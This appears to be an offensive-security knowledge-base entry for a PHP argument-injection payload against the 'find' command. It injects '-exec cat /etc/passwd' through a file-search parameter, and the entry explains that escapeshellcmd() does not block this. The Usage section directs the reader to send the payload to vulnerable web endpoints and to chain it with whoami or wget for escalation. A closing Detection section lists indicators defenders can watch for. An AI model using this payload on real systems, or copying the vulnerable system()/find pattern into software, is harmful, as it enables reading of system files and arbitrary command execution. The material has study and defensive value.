---
type: code
language: PHP
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - PHP
tags:
  - Argument-Injection
  - FIND
  - Command-Execution
validated: true
---

# PHP-Find-Command-Argument-Injection-Read-Passwd

## Code

```php
$file = "sth -or -exec cat /etc/passwd ; -quit";
system("find /tmp -iname " . escapeshellcmd($file));
```

## Description

This PHP code snippet exploits argument injection in the 'find' command by setting the $file variable to a payload that injects find options: -or short-circuits the search, -exec runs cat /etc/passwd to read the password file, and ; -quit terminates the expression. Even with escapeshellcmd(), the injection succeeds because it targets find's argument parser, not the shell, allowing arbitrary command execution on the target system.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $file | Injected filename payload | "sth -or -exec cat /etc/passwd ; -quit" |

## Usage

Inject this payload into a web application's file search parameter that uses system('find ... $file'). In a red team scenario, deliver via HTTP POST to a vulnerable endpoint; listen for output containing /etc/passwd contents. Chain with other payloads for escalation, e.g., replace cat with whoami or wget for further exploitation.

## Detection

- Anomalous 'find' processes with -exec options in process lists or logs (e.g., ps aux | grep find).
- Unexpected file reads on /etc/passwd via filesystem auditing.
- Web server logs showing suspicious query parameters with find flags like -exec or -or.
- IDS alerts on command execution patterns in PHP system() calls.

## Related

- [[procedures/Argument-Injection-via-Find-Command]]
